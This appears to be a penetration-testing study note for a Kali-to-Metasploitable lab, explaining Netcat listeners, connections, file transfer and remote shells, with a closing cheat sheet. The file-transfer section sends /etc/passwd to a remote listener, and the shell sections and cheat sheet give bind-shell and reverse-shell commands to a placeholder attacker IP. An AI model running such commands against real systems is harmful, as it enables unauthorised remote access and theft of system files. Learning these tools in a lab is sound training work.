##  Netcat (nc)

Netcat is a versatile networking tool used for reading from and writing to network connections using TCP or UDP.

---

###  Basic Concepts

- **Protocol**: Defines how devices communicate (e.g., TCP/UDP).
    
- **Port**: An interface to access a service (Range: 0–65535).
    
- **Netcat**: Often called `nc`, used for:
    
    - Port scanning
        
    - Banner grabbing
        
    - File transfer
        
    - Remote shells
        

---

###  Basic Netcat Communication

#### Listener Side (Metasploitable):

```bash
nc -l -p 4444
```

- `-l`: Listen mode
    
- `-p`: Port number
    

#### Attacker Side (Kali):

```bash
nc <IP_of_meta> <port>
# Example:
nc 192.168.1.4 4444
```

 After running the above commands, anything typed on one side will appear on the other.

---

###  Verbose Mode

```bash
# Listener:
nc -l -v -p 4444

# Connector:
nc 192.168.1.4 4444 -v
```

- `-v`: Verbose output
    
- Add more `v`s for more detail (e.g., `-vvv`, `-vvvv`)
    

---

###  Connecting to Web Services

```bash
nc -v google.com 80
```

```bash
nc -v -n 142.250.200.238 80
```

- `-n`: Do not perform DNS resolution
    

---

###  Using /etc/hosts for Custom Hostnames

```bash
sudo nano /etc/hosts
```

Add:

```
192.168.1.4	meta.net
```

Then:

```bash
nc -v meta.net 4444
```

---

###  File Transfer Using Netcat

```bash
# On the receiver:
nc -nlvp 4444 > received.txt

# On the sender:
nc -nv <target_ip> 4444 < /etc/passwd
```

 Tip:  
To monitor file arrival in real-time on Kali:

```bash
watch -n 0.5 -d ls -la
```

---

##  Remote Shells Using Netcat

###  1. Bind Shell

- Attacker connects to a victim that is **listening** with a shell.
    

**Victim (Metasploitable):**

```bash
nc -nlvp 4444 -e /bin/bash
```

**Attacker (Kali):**

```bash
nc <victim_ip> 4444
```

> `-e`: Execute the specified program after connection.

---

###  2. Reverse Shell

- Victim connects back to the attacker.
    
- Useful when **firewalls block inbound** but allow **outbound** connections.
    

**Attacker (Kali, listener):**

```bash
nc -nlvp 4444
```

**Victim (Metasploitable):**

```bash
nc <attacker_ip> 4444 -e /bin/bash
```

---

##  Netcat Relay

Advanced Netcat usage — acting as a relay or proxy between systems. This is used in pivoting and advanced exploitation techniques (covered later in OSCP).

---

### Summary Cheat Sheet

```bash
# Basic listener
nc -nlvp <port>

# Basic sender
nc <ip> <port>

# File transfer
nc -nlvp <port> > out.txt
nc <ip> <port> < in.txt

# Bind shell
nc -nlvp <port> -e /bin/bash

# Reverse shell
# Victim:
nc <attacker_ip> <port> -e /bin/bash
```

### [[02- Socat|Next]]


